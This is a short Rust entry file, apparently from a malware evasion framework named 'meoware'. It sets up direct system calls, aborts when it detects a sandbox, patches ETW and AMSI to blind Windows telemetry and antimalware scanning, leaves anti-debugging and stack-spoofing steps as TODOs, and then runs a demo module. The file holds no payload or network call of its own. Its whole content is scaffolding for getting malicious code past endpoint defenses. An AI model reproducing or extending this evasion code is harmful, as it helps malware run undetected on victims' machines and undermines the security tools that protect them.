#![cfg_attr(not(any(debug_assertions, feature = "verbose")), no_std)]

use meoware::core::{ssn_table, sandbox, etw, amsi};
use meoware::debug;

fn main() {
    unsafe {
        if !ssn_table::initialize_syscalls(core::ptr::null_mut()) {
            return;
        }
        
        if !sandbox::is_real_environment() {
            debug!("[SANDBOX] Environment check failed — aborting");
            return
        } 
        
        /*
            TODO: Debugging check
            if !anti_debugging::is_safe_environment() {
                return
            } 
        */

        etw::patch_etw();
        amsi::patch_amsi();        

        /* TODO: spoof stack */

        meoware::core::demo::demo();
    }
}
